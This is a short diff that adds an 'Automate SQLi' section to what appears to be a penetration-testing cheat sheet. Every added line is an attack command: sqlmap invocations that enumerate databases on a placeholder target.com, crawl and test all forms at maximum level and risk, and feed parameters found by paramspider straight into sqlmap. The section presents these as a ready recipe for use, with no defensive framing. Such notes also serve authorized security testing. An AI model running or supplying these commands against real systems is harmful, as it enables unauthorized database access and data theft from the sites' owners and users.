@@ -2555,7 +2555,20 @@ AND false	False
 ```
 
 
+## Automate SQLi
+```bash
+# sqlmap
+sqlmap -u target.com/test?id=10 -p id --random-agent --dbs
 
+# sqlmap is test all forms in target and answered the wizard questios to default
+sqlmap -u target.com --forms --batch --crawl=10 --threads=10 --level=5 --risk=3
+
+# find all parameters on target and send to sqlmap
+python3 paramspider.py -d target.com -s TRUE -e woff,ttf,eot,svg | deduplicate --sort | sed '1,4d' | sqlmap
+
+# you can use sqlmap + burp --> burp extension sqlipy (integrated by sqlmap)
+
+```
 
 
 
